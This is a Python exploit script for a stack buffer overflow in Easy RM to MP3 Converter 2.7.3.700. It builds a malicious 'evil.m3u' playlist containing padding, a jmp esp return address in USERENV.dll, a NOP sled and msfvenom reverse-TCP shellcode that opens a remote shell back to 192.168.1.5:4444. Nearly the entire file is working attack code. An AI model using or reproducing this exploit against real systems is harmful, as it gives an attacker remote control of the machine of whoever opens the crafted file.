# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in EasyRMtoMP3Converterv2.7.3.700. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.


# Offset: 26062
# 0x769eb6d1 : jmp esp |  {PAGE_EXECUTE_READ} [USERENV.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USERENV.dll) 
# badchars: \x00\x0A\x0D
# shellcode command: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0A\x0D' -f python -v scode


file = open("evil.m3u","w")

scode =  ""
scode += "\xbb\xbb\x4d\xb9\xaf\xd9\xeb\xd9\x74\x24\xf4\x5f\x31"
scode += "\xc9\xb1\x56\x31\x5f\x13\x03\x5f\x13\x83\xc7\xbf\xaf"
scode += "\x4c\x53\x57\xad\xaf\xac\xa7\xd2\x26\x49\x96\xd2\x5d"
scode += "\x19\x88\xe2\x16\x4f\x24\x88\x7b\x64\xbf\xfc\x53\x8b"
scode += "\x08\x4a\x82\xa2\x89\xe7\xf6\xa5\x09\xfa\x2a\x06\x30"
scode += "\x35\x3f\x47\x75\x28\xb2\x15\x2e\x26\x61\x8a\x5b\x72"
scode += "\xba\x21\x17\x92\xba\xd6\xef\x95\xeb\x48\x64\xcc\x2b"
scode += "\x6a\xa9\x64\x62\x74\xae\x41\x3c\x0f\x04\x3d\xbf\xd9"
scode += "\x55\xbe\x6c\x24\x5a\x4d\x6c\x60\x5c\xae\x1b\x98\x9f"
scode += "\x53\x1c\x5f\xe2\x8f\xa9\x44\x44\x5b\x09\xa1\x75\x88"
scode += "\xcc\x22\x79\x65\x9a\x6d\x9d\x78\x4f\x06\x99\xf1\x6e"
scode += "\xc9\x28\x41\x55\xcd\x71\x11\xf4\x54\xdf\xf4\x09\x86"
scode += "\x80\xa9\xaf\xcc\x2c\xbd\xdd\x8e\x38\x72\xec\x30\xb8"
scode += "\x1c\x67\x42\x8a\x83\xd3\xcc\xa6\x4c\xfa\x0b\xbf\x5b"
scode += "\xfd\xc4\x07\x0b\x03\xe5\x77\x05\xc0\xb1\x27\x3d\xe1"
scode += "\xb9\xac\xbd\x0e\x6c\x58\xb4\x98\x4f\x34\xc9\x5d\x38"
scode += "\x46\xca\x4c\xe4\xcf\x2c\x3e\x44\x9f\xe0\xff\x34\x5f"
scode += "\x51\x68\x5f\x50\x8e\x88\x60\xbb\xa7\x23\x8f\x15\x9f"
scode += "\xdb\x36\x3c\x6b\x7d\xb6\xeb\x11\xbd\x3c\x19\xe5\x70"
scode += "\xb5\x68\xf5\x65\xa2\x92\x05\x76\x47\x92\x6f\x72\xc1"
scode += "\xc5\x07\x78\x34\x21\x88\x83\x13\x32\xcf\x7c\xe2\x02"
scode += "\xbb\x4b\x70\x2a\xd3\xb3\x94\xaa\x23\xe2\xfe\xaa\x4b"
scode += "\x52\x5b\xf9\x6e\x9d\x76\x6e\x23\x08\x79\xc6\x97\x9b"
scode += "\x11\xe4\xce\xec\xbd\x17\x25\x6f\xb9\xe7\xbb\x58\x62"
scode += "\x8f\x43\xd9\x92\x4f\x2e\xd9\xc2\x27\xa5\xf6\xed\x87"
scode += "\x46\xdd\xa5\x8f\xcd\xb0\x04\x2e\xd1\x98\xc9\xee\xd2"
scode += "\x2f\xd2\x01\xa8\x40\xe5\xe2\x4d\x49\x82\xe3\x4d\x75"
scode += "\xb4\xd8\x9b\x4c\xc2\x1f\x18\xeb\xdd\x2a\x3d\x5a\x74"
scode += "\x54\x11\x9c\x5d"


evilString = "A" * 26062 + "\xd1\xb6\x9e\x76" + "\x90"* 10 + scode + "\x90" * 600

file.write(evilString)
file.close()
